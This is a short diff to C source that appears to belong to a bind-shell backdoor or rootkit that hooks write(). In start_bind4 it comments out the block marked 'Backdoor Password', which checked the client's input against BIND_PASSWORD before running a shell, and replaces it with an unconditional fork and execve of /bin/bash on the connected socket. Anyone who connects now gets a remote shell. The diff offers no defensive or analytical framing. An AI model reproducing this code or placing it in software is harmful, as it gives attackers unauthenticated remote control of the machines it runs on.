@@ -31,17 +31,27 @@ void start_bind4() {
 	for (int i = 0; i < 3; i++)
 		dup2(client_sockfd, i);
 	
-	char input[30];
+	/* Backdoor Password */
+	/* char input[30];
 	read(client_sockfd, input, sizeof(input));
 	input[strcspn(input, "\n")] = '\0';
 
 	if (strcmp(input, BIND_PASSWORD) == 0) {
-		execve("/bin/sh", NULL, NULL);
+		int pid = fork();
+		if (pid == 0) {
+			execve("/bin/sh", NULL, NULL);
+		}
 		close(sockfd);
 	} else {
 		shutdown(client_sockfd, SHUT_RDWR);
 		close(sockfd);
+	} */
+
+	int pid = fork();
+	if (pid == 0) {
+		execve("/bin/bash", NULL, NULL);
 	}
+	close(sockfd);
 }
 
 ssize_t write(int fildes, const void *buf, size_t nbytes) {
